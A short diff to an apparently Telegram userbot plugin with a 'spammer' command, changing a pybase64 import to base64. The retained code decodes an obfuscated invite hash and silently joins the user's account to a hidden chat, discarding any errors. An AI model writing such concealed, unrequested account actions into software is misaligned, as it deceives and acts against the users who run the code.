@@ -1,7 +1,7 @@
 import asyncio
 import os
 
-import pybase64
+import base64
 from telethon import functions, types
 from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 
@@ -21,7 +21,7 @@ async def spammer(e):
     if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
         os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
     try:
-        hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         hmm = Get(hmm)
         await e.client(hmm)
     except BaseException:
@@ -169,7 +169,7 @@ async def spammer(e):
     if not os.path.isdir(Config.TMP_DOWNLOAD_DIRECTORY):
         os.makedirs(Config.TMP_DOWNLOAD_DIRECTORY)
     try:
-        hmm = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        hmm = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
         hmm = Get(hmm)
         await e.client(hmm)
     except BaseException:
